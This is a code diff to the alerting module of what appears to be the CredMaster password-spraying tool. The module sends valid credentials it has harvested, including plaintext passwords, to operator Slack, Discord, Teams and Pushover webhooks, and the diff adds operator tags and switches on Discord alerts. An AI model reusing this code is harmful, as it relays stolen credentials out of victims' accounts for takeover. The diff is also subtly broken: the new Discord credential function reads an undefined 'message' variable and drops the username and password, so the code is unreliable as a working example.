@@ -6,23 +6,23 @@ from datetime import datetime
 def notify_success(username, password, notify_obj):
 
     slack_webhook = notify_obj['slack_webhook']
-    # discord_webhook = notify_obj['discord_webhook']
+    discord_webhook = notify_obj['discord_webhook']
     teams_webhook = notify_obj['teams_webhook']
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
     operator = notify_obj['operator_id']
 
     if slack_webhook is not None:
-        slack_notify(username, password, slack_webhook)
+        slack_notify(username, password, operator, slack_webhook)
 
     if pushover_token is not None and pushover_user is not None:
-        pushover_notify(username, password, pushover_token, pushover_user)
+        pushover_notify(username, password, operator, pushover_token, pushover_user)
 
-    # if discord_webhook is not None:
-    #     discord_notify(username, password, discord_webhook)
+    if discord_webhook is not None:
+        discord_notify(username, password, operator, discord_webhook)
 
     if teams_webhook is not None:
-        teams_notify(username, password, teams_webhook)
+        teams_notify(username, password, operator, teams_webhook)
 
 
 def notify_update(message, notify_obj):
@@ -35,27 +35,31 @@ def notify_update(message, notify_obj):
     operator = notify_obj['operator_id']
 
     if slack_webhook is not None:
-        slack_update(message, slack_webhook, operator)
+        slack_update(message, operator, slack_webhook)
 
     if pushover_token is not None and pushover_user is not None:
-        pushover_update(message, pushover_token, pushover_user)
+        pushover_update(message, operator, pushover_token, pushover_user)
 
     if discord_webhook is not None:
-        discord_update(message, discord_webhook)
+        discord_update(message, operator, discord_webhook)
 
     if teams_webhook is not None:
-        teams_update(message, teams_webhook)
+        teams_update(message, operator, teams_webhook)
 
 
 # Function for posting username/password to slack channel
-def slack_notify(username, password, webhook):
+def slack_notify(username, password, operator, webhook):
 
     now = datetime.now()
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
+    insert = ""
+    if operator is not None:
+        insert = f"Operator: {operator}\n"
+
     text = ("```[Valid Credentials Obtained!]\n"
-            f"Operator: {operator}\n"
+            f"{insert}"
             f"User: {username}\n"
             f"Pass: {password}\n"
             f"Date: {date}\n"
@@ -72,14 +76,18 @@ def slack_notify(username, password, webhook):
 
 
 # Function for debug messages
-def slack_update(message, webhook, operator):
+def slack_update(message, operator, webhook):
 
     now = datetime.now()
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
+    insert = ""
+    if operator is not None:
+        insert = f"Operator: {operator}\n"
+
     text = ("```[Log Entry]\n"
-            f"Operator: {operator}\n"
+            f"{insert}"
             f"{message}\n"
             f"Date: {date}\n"
             f"Time: {time}```")
@@ -93,8 +101,8 @@ def slack_update(message, webhook, operator):
     )
 
 
-# Discord notify message
-def discord_update(message, webhook):
+# Function for posting username/password to Discord
+def discord_notify(username, password, operator, webhook):
     url = webhook
     data = {
     "content" : f"{message}",
@@ -103,27 +111,31 @@ def discord_update(message, webhook):
     response = requests.post(url, json = data)
 
 
-# Function for posting username/password to Discord
-# def discord_notify(username, password, webhook):
-#     url = webhook
-#     data = {
-#     "content" : f"{message}",
-#     "username" : "CredMaster-Bot"
-#     }
-#     response = requests.post(url, json = data)
+# Discord notify message
+def discord_update(message, operator, webhook):
+    url = webhook
+    data = {
+    "content" : f"{message}",
+    "username" : "CredMaster-Bot"
+    }
+    response = requests.post(url, json = data)
 
 
 # Teams notify function
-def teams_notify(username, password, webhook):
+def teams_notify(username, password, operator, webhook):
 
     now = datetime.now()
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
+    insert = ""
+    if operator is not None:
+        insert = f"Operator: {operator}\n"
+
     response = requests.post(
         url=webhook,
         content = ("[Valid Credentials Obtained!]\n"
-        f"Operator: {operator}\n"
+        f"{insert}"
         f"User: {username}\n"
         f"Pass: {password}\n"
         f"Date: {date}\n"
@@ -139,16 +151,20 @@ def teams_notify(username, password, webhook):
     )
 
 # Teams message notify function
-def teams_update(message, webhook):
+def teams_update(message, operator, webhook):
 
     now = datetime.now()
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
+    insert = ""
+    if operator is not None:
+        insert = f"Operator: {operator}\n"
+
     response = requests.post(
         url=webhook,
         content = ("[Log Entry]\n"
-        f"Operator: {operator}\n"
+        f"{insert}"
         f"Message: {message}\n"
         f"Date: {date}\n"
         f"Time: {time}"),
@@ -164,7 +180,7 @@ def teams_update(message, webhook):
 
 
 # Pushover notify of valid creds
-def pushover_notify(username, password, token, user):
+def pushover_notify(username, password, operator, token, user):
 
     headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
 
@@ -172,7 +188,11 @@ def pushover_notify(username, password, token, user):
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    text = (f"Operator: {operator}\n"
+    insert = ""
+    if operator is not None:
+        insert = f"Operator: {operator}\n"
+
+    text = (f"{insert}"
             f"User: {username}\n"
             f"Pass: {password}\n"
             f"Date: {date}\n"
@@ -190,7 +210,7 @@ def pushover_notify(username, password, token, user):
 
 
 # Pushover generic update messages
-def pushover_update(message, token, user):
+def pushover_update(message, operator, token, user):
 
     headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
 
@@ -198,7 +218,12 @@ def pushover_update(message, token, user):
     date=now.strftime("%d-%m-%Y")
     time=now.strftime("%H:%M:%S")
 
-    text = (f"{message}\n"
+    insert = ""
+    if operator is not None:
+        insert = f"Operator: {operator}\n"
+
+    text = (f"{insert}"
+            f"{message}\n"
             f"Date: {date}\n"
             f"Time: {time}")
 
